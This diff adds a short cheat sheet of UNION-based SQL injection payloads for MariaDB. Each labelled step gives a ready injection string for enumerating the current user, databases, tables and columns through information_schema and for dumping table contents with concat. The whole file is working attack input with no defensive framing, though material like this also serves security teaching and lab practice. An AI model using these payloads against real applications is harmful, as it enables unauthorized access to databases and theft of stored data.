@@ -1,0 +1,49 @@
+MariaDB
+Current User...........................................
+'union select user(),1#
+
+System Users...........................................
+'union select system_user(),1#
+
+Get current database name..............................
+'union select database(),1#
+
+Get its tables.........................................
+'union select table_name,1 from information_schema.tables#
+
+Get its users table data.....................................
+'union select table_name,1 from information_schema.tables WHERE table_name="users"#
+
+Count how many databases in the Server...................
+1' union SELECT count( schema_name),null FROM information_schema.schemata#
+
+Get database names.......................................
+'union SELECT schema_name,1 FROM information_schema.schemata#
+
+Get database tables......................................
+'union select table_name,1 from information_schema.tables where table_schema="information_schema"#
+
+Get specific database........................................
+'union select table_name,1 from information_schema.tables where table_schema="information_schema"AND table_name="ALL_PLUGINS"#
+
+Get all the columns in the database tables.........................
+'union select column_name,1 from information_schema.columns where table_schema="information_schema"#
+
+
+Get columns in a SPECIFIC table........................................ 
+'union select column_name,1 from information_schema.columns where table_schema="information_schema"AND table_name="APPLICABLE_ROLES"#
+
+'union select column_name,1 from information_schema.columns where table_schema="information_schema"AND table_name="SPATIAL_REF_SYS"#
+
+Get columns count in a specific table.................................
+'union select count(column_name),1 from information_schema.columns where table_schema="information_schema"AND table_name="APPLICABLE_ROLES"#
+
+Get table content from specific table.................................
+'union select null,concat(GRANTEE,ROLE_NAME,IS_GRANTABLE,IS_DEFAULT)from information_schema.APPLICABLE_ROLES#
+
+'union select 1,concat(SRID,SRTEXT,AUTH_SRID,AUTH_NAME)from information_schema.SPATIAL_REF_SYS#
+
+'union select 1,concat(PLUGIN_NAME,PLUGIN_VERSION)from information_schema.ALL_PLUGINS#
+
+
+
